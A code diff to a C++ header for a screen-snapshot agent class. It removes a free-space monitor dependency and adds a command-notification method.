@@ -15,7 +15,6 @@
 
 #include "AbstractAgent.h"
 #include "AdditionalDataStructs.h"
-#include "MonitorFreeSpace.h"
 
 #include <HT\TimeOutTimer.h>
 
@@ -25,7 +24,7 @@
  *  CAgentSnapshot
  * 
  */
-class CAgentSnapshot : public CAbstractAgent, public MTimeOutNotifier, public MFreeSpaceCallBack
+class CAgentSnapshot : public CAbstractAgent, public MTimeOutNotifier
 	{
 public:
 	// Constructors and destructor
@@ -49,15 +48,12 @@ protected:
 	// From AbstractQueueEndPoint
 	virtual void StartAgentCmdL();
 	virtual void StopAgentCmdL();
+	virtual void NotifyAgentCmdL(TUint32 aData);
 		
 private:
 	// From MTimeOutNotifier
     virtual void TimerExpiredL(TAny* src);
 
-    // From MFreeSpaceCallBack
-    virtual void NotifyAboveThreshold();
-    virtual void NotifyBelowThreshold();
-    	
     // Capture the image into mbm format
     void DoCaptureL();
     
@@ -83,8 +79,7 @@ private:
 	CFbsBitmap*          iBitmap;
 	TBool   iCapturedScreen;
 	
-	CFreeSpaceMonitor*		iFreeSpaceMonitor;
-	TBool  iBelowQuota;
+	TBool  iBelowFreespaceQuota;
 		
 	};
 
